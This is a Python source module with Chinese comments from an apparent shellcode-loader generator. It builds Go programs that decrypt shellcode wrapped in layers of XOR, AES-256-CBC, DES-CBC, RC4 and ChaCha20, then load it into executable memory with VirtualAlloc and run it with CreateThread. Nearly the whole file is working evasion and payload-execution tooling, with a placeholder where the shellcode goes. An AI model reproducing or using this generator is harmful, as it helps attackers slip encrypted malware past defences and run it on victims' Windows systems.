#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Go解密加载器模块：单一职责 - 仅实现Go解密加载器生成，遵循BaseLoader接口
"""
from core.loader.base_loader import BaseLoader
from core.encrypt.encrypt_manager import EncryptionHistory

class GoDecryptLoader(BaseLoader):
    """Go解密加载器：单一职责 - 仅生成Go解密加载器（适配加密历史）"""
    @property
    def lang_name(self) -> str:
        return "Go"
    
    def generate_raw(self, shellcode_len: int) -> str:
        """（解密加载器可复用原始加载器逻辑）"""
        from core.loader.raw_loader.go_raw_loader import GoRawLoader
        return GoRawLoader().generate_raw(shellcode_len)
    
    def generate_decrypt(self, shellcode_len: int, encryption_history: EncryptionHistory) -> str:
        """生成Go解密加载器内容（适配XOR/AES-256-CBC/DES-CBC/RC4/ChaCha20加密历史）"""
        encrypt_history = encryption_history.get_full_history()
        decrypt_functions = []
        decrypt_calls = []
        key_iv_definitions = []
        imports = set()

        # 构建解密函数和调用逻辑（按加密逆序解密）
        for idx, encrypt_info in enumerate(reversed(encrypt_history), 1):
            alg = encrypt_info["alg"]
            params = encrypt_info["params"]

            if alg == "XOR":
                # XOR解密定义
                key_hex = params["key_hex"]
                key_len = params["key_len"]
                key_def = f"// XOR解密密钥（第{idx}轮加密）\nvar xorKey{idx} = []byte{{{', '.join([f'0x{key_hex[i:i+2]}' for i in range(0, len(key_hex), 2)])}}}\nvar xorKeyLen{idx} = {key_len}"
                key_iv_definitions.append(key_def)

                xor_decrypt = f"""// XOR解密函数（第{idx}轮）
func xorDecrypt{idx}(shellcode []byte) {{
    for i := range shellcode {{
        shellcode[i] ^= xorKey{idx}[i % xorKeyLen{idx}]
    }}
}}"""
                decrypt_functions.append(xor_decrypt)
                decrypt_calls.append(f"xorDecrypt{idx}(shellcode)")

            elif alg == "AES-256-CBC":
                # AES-256-CBC解密定义（依赖crypto/aes）
                key_hex = params["key_hex"]
                iv_hex = params["iv_hex"]
                key_def = f"// AES-256-CBC解密密钥和IV（第{idx}轮加密）\nvar aesKey{idx} = []byte{{{', '.join([f'0x{key_hex[i:i+2]}' for i in range(0, len(key_hex), 2)])}}}\nvar aesIV{idx} = []byte{{{', '.join([f'0x{iv_hex[i:i+2]}' for i in range(0, len(iv_hex), 2)])}}}"
                key_iv_definitions.append(key_def)
                
                # 添加必要的导入
                imports.add("crypto/aes")
                imports.add("crypto/cipher")
                imports.add("errors")

                aes_decrypt = f"""// AES-256-CBC解密函数（第{idx}轮）
func aes256CbcDecrypt{idx}(shellcode []byte) ([]byte, error) {{
    block, err := aes.NewCipher(aesKey{idx})
    if err != nil {{
        return nil, err
    }}

    if len(shellcode) % aes.BlockSize != 0 {{
        return nil, errors.New("invalid shellcode length for AES decryption")
    }}

    mode := cipher.NewCBCDecrypter(block, aesIV{idx})
    mode.CryptBlocks(shellcode, shellcode)
    
    // 去除PKCS7填充
    if len(shellcode) == 0 {{
        return nil, errors.New("empty shellcode after decryption")
    }}
    padLen := int(shellcode[len(shellcode)-1])
    if padLen > aes.BlockSize || padLen == 0 {{
        return nil, errors.New("invalid PKCS7 padding")
    }}
    if padLen > len(shellcode) {{
        return nil, errors.New("padding length greater than shellcode length")
    }}
    return shellcode[:len(shellcode)-padLen], nil
}}"""
                decrypt_functions.append(aes_decrypt)
                decrypt_calls.append(f"shellcode, err = aes256CbcDecrypt{idx}(shellcode)\n    if err != nil {{ panic(err) }}")

            elif alg == "DES-CBC":
                # DES-CBC解密定义（依赖crypto/des）
                key_hex = params["key_hex"]
                iv_hex = params["iv_hex"]
                key_def = f"// DES-CBC解密密钥和IV（第{idx}轮加密）\nvar desKey{idx} = []byte{{{', '.join([f'0x{key_hex[i:i+2]}' for i in range(0, len(key_hex), 2)])}}}\nvar desIV{idx} = []byte{{{', '.join([f'0x{iv_hex[i:i+2]}' for i in range(0, len(iv_hex), 2)])}}}"
                key_iv_definitions.append(key_def)
                
                # 添加必要的导入
                imports.add("crypto/des")
                imports.add("crypto/cipher")
                imports.add("errors")

                des_decrypt = f"""// DES-CBC解密函数（第{idx}轮）
func desCbcDecrypt{idx}(shellcode []byte) ([]byte, error) {{
    block, err := des.NewCipher(desKey{idx})
    if err != nil {{
        return nil, err
    }}

    if len(shellcode) % des.BlockSize != 0 {{
        return nil, errors.New("invalid shellcode length for DES decryption")
    }}

    mode := cipher.NewCBCDecrypter(block, desIV{idx})
    mode.CryptBlocks(shellcode, shellcode)
    
    // 去除PKCS7填充
    if len(shellcode) == 0 {{
        return nil, errors.New("empty shellcode after decryption")
    }}
    padLen := int(shellcode[len(shellcode)-1])
    if padLen > des.BlockSize || padLen == 0 {{
        return nil, errors.New("invalid PKCS7 padding")
    }}
    if padLen > len(shellcode) {{
        return nil, errors.New("padding length greater than shellcode length")
    }}
    return shellcode[:len(shellcode)-padLen], nil
}}"""
                decrypt_functions.append(des_decrypt)
                decrypt_calls.append(f"shellcode, err = desCbcDecrypt{idx}(shellcode)\n    if err != nil {{ panic(err) }}")

            elif alg == "RC4":
                # RC4解密定义
                key_hex = params["key_hex"]
                key_len = params["key_len"]
                key_def = f"// RC4解密密钥（第{idx}轮加密）\nvar rc4Key{idx} = []byte{{{', '.join([f'0x{key_hex[i:i+2]}' for i in range(0, len(key_hex), 2)])}}}\nvar rc4KeyLen{idx} = {key_len}"
                key_iv_definitions.append(key_def)

                rc4_decrypt = f"""// RC4解密函数（第{idx}轮）
func rc4Decrypt{idx}(shellcode []byte) {{
    // 初始化S盒
    sBox := make([]byte, 256)
    for i := range sBox {{
        sBox[i] = byte(i)
    }}
    j := 0
    for i := 0; i < 256; i++ {{
        j = (j + int(sBox[i]) + int(rc4Key{idx}[i % rc4KeyLen{idx}])) % 256
        sBox[i], sBox[j] = sBox[j], sBox[i]
    }}
    
    // 解密过程
    i := 0
    j = 0
    for k := range shellcode {{
        i = (i + 1) % 256
        j = (j + int(sBox[i])) % 256
        sBox[i], sBox[j] = sBox[j], sBox[i]
        t := (int(sBox[i]) + int(sBox[j])) % 256
        kValue := sBox[t]
        shellcode[k] ^= kValue
    }}
}}"""
                decrypt_functions.append(rc4_decrypt)
                decrypt_calls.append(f"rc4Decrypt{idx}(shellcode)")

            elif alg == "ChaCha20":
                # ChaCha20解密定义（依赖crypto/cipher）
                key_hex = params["key_hex"]
                nonce_hex = params["nonce_hex"]
                key_def = f"// ChaCha20解密密钥和Nonce（第{idx}轮加密）\nvar chacha20Key{idx} = []byte{{{', '.join([f'0x{key_hex[i:i+2]}' for i in range(0, len(key_hex), 2)])}}}\nvar chacha20Nonce{idx} = []byte{{{', '.join([f'0x{nonce_hex[i:i+2]}' for i in range(0, len(nonce_hex), 2)])}}}"
                key_iv_definitions.append(key_def)
                
                # 添加必要的导入
                imports.add("crypto/cipher")
                imports.add("golang.org/x/crypto/chacha20")

                chacha20_decrypt = f"""// ChaCha20解密函数（第{idx}轮）
func chacha20Decrypt{idx}(shellcode []byte) ([]byte, error) {{
    c, err := chacha20.NewUnauthenticatedCipher(chacha20Key{idx}, chacha20Nonce{idx})
    if err != nil {{
        return nil, err
    }}
    c.XORKeyStream(shellcode, shellcode)
    return shellcode, nil
}}"""
                decrypt_functions.append(chacha20_decrypt)
                decrypt_calls.append(f"shellcode, err = chacha20Decrypt{idx}(shellcode)\n    if err != nil {{ panic(err) }}")

        # 构建导入语句
        import_lines = []
        import_lines.append("syscall")
        import_lines.append("unsafe")
        for imp in sorted(imports):
            import_lines.append(imp)

        # 拼接完整加载器内容
        import_str = "\n    ".join([f'"{imp}"' for imp in import_lines])
        full_decrypt_content = f"""package main

import (
    {import_str}
)

const (
    MEM_COMMIT  = 0x1000
    MEM_RESERVE = 0x2000
    PAGE_EXECUTE_READWRITE = 0x40
    INFINITE = 0xFFFFFFFF
)

var (
    kernel32 = syscall.NewLazyDLL("kernel32.dll")
    
    virtualAlloc = kernel32.NewProc("VirtualAlloc")
    rtlMoveMemory = kernel32.NewProc("RtlMoveMemory")
    createThread = kernel32.NewProc("CreateThread")
    waitForSingleObject = kernel32.NewProc("WaitForSingleObject")
    virtualFree = kernel32.NewProc("VirtualFree")
    closeHandle = kernel32.NewProc("CloseHandle")
)

{'\n\n'.join(key_iv_definitions)}
{'\n\n'.join(decrypt_functions)}

func main() {{
    // 占位符：替换为你的加密后格式化shellcode
    shellcode := []byte{{/* 此处填入字节数组格式shellcode */}}
    shellcodeLen := {shellcode_len}
    var err error

    // 执行解密（按加密逆序）
    {'\n    '.join(decrypt_calls)}

    // 刷新shellcode长度（解密后可能变化）
    shellcodeLen = len(shellcode)

    // 分配可执行内存
    mem, _, err := virtualAlloc.Call(
        0,
        uintptr(shellcodeLen),
        uintptr(MEM_COMMIT|MEM_RESERVE),
        uintptr(PAGE_EXECUTE_READWRITE),
    )
    if mem == 0 {{
        panic("VirtualAlloc failed: " + err.Error())
    }}

    // 复制解密后的shellcode到内存
    _, _, _ = rtlMoveMemory.Call(
        mem,
        uintptr(unsafe.Pointer(&shellcode[0])),
        uintptr(shellcodeLen),
    )

    // 创建线程执行shellcode
    hThread, _, err := createThread.Call(
        0,
        0,
        mem,
        0,
        0,
        0,
    )
    if hThread == 0 {{
        panic("CreateThread failed: " + err.Error())
    }}

    // 等待线程执行完成
    _, _, _ = waitForSingleObject.Call(
        hThread,
        uintptr(INFINITE),
    )

    // 清理资源
    _, _, _ = closeHandle.Call(hThread)
    _, _, _ = virtualFree.Call(
        mem,
        0,
        0x8000, // MEM_RELEASE
    )
}}
"""
        return full_decrypt_content
